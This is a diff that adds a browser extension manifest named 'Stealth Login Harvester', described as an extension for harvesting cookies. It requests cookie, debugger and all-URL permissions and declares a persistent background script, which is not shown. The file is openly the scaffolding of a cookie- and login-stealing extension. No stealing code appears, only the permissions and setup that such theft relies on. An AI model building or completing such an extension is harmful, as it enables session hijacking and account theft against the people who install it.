@@ -1,0 +1,23 @@
+{
+  "name": "Stealth Login Harvester",
+  "version": "0.1.0",
+  "description": "extension for harvesting cookies",
+  "permissions": [
+    "cookies",
+    "debugger",
+    "*://localhost*",
+    "https://*/",
+    "activeTab",
+    "<all_urls>"
+  ],
+  "browser_action": {
+    "default_title": "Stealth Login Harvester"
+  },
+  "background": {
+    "scripts": [
+      "background.js"
+    ],
+    "persistent": true
+  },
+  "manifest_version": 2
+}
